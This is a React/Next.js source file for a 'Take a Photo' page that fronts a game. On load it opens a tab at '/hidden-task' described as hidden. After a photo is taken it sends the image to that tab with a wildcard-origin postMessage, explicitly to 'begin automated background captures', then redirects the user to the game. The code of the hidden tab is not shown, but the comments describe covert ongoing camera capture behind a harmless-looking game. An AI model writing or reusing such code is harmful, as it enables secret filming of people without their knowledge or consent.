"use client";

import React, { useEffect, useRef, useState } from "react";

export default function CameraPage() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [bgTab, setBgTab] = useState<Window | null>(null);
  const [error, setError] = useState<string | null>(null);

  // ---------------------------------------------------------
  // AUTO-START: open hidden background tab + camera preview
  // ---------------------------------------------------------
  useEffect(() => {
    async function init() {
      // 1️⃣ Open hidden tab first (so browser won't block it)
      const tab = window.open("/hidden-task", "_blank");
      setBgTab(tab || null);

      // 2️⃣ Request camera immediately
      try {
        const s = await navigator.mediaDevices.getUserMedia({ video: true });
        setStream(s);

        if (videoRef.current) {
          videoRef.current.srcObject = s;
          await videoRef.current.play();
        }
      } catch (err) {
        setError("Camera permission is required to continue.");
      }
    }

    init();
  }, []);

  // ---------------------------------------------------------
  // Capture Photo → Save to localStorage → Trigger hidden task
  // ---------------------------------------------------------
  async function takePhoto() {
    if (!videoRef.current) return;

    const canvas = document.createElement("canvas");
    canvas.width = 300;
    canvas.height = 300;

    const ctx = canvas.getContext("2d")!;

    // round crop
    ctx.beginPath();
    ctx.arc(150, 150, 150, 0, Math.PI * 2);
    ctx.clip();

    ctx.drawImage(videoRef.current, 0, 0, 300, 300);

    const dataURL = canvas.toDataURL("image/png");

    // store locally for the game
    localStorage.setItem("playerPhoto", dataURL);

    // notify hidden tab to begin automated background captures
    bgTab?.postMessage({ start: true, img: dataURL }, "*");

    // stop preview camera
    stream?.getTracks().forEach((t) => t.stop());

    // redirect to game
    window.location.href = "/fun/game";
  }

  return (
    <main style={pageStyle}>
      <h2 style={{ marginBottom: 20 }}>Take a Photo</h2>

      {/* Round camera preview */}
      <div style={circleWrapper}>
        <video ref={videoRef} style={videoStyle} playsInline muted />
      </div>

      {/* Capture Button */}
      <button style={snapBtn} onClick={takePhoto}>
        📸 Capture Photo
      </button>

      {/* Error Popup */}
      {error && (
        <div style={errorPopup}>
          <div style={errorBox}>
            <h3>Permission Required</h3>
            <p>{error}</p>
            <button onClick={() => window.location.reload()} style={errorBtn}>
              Retry
            </button>
          </div>
        </div>
      )}
    </main>
  );
}

/* -----------------------------------------------------------
   MOBILE-FIRST UI STYLES
----------------------------------------------------------- */

const pageStyle: React.CSSProperties = {
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "start",
  paddingTop: 40,
  height: "100vh",
  background: "linear-gradient(140deg,#0f0c29,#302b63,#24243e)",
  color: "white",
  textAlign: "center",
  fontFamily: "Inter, sans-serif",
};

const circleWrapper: React.CSSProperties = {
  width: 260,
  height: 260,
  borderRadius: "50%",
  overflow: "hidden",
  border: "4px solid white",
  marginBottom: 20,
};

const videoStyle: React.CSSProperties = {
  width: "100%",
  height: "100%",
  objectFit: "cover",
};

const snapBtn: React.CSSProperties = {
  width: "80%",
  padding: "14px",
  marginTop: 20,
  borderRadius: 50,
  background: "#2ec4b6",
  color: "white",
  border: "none",
  fontSize: 18,
  cursor: "pointer",
  boxShadow: "0 4px 12px rgba(0,0,0,0.3)",
};

const errorPopup: React.CSSProperties = {
  position: "fixed",
  inset: 0,
  background: "rgba(0,0,0,0.7)",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
};

const errorBox: React.CSSProperties = {
  background: "white",
  color: "black",
  padding: 20,
  borderRadius: 12,
  width: "80%",
  maxWidth: 300,
  textAlign: "center",
};

const errorBtn: React.CSSProperties = {
  padding: "10px 20px",
  marginTop: 12,
  background: "#302b63",
  color: "white",
  border: "none",
  borderRadius: 8,
  cursor: "pointer",
};
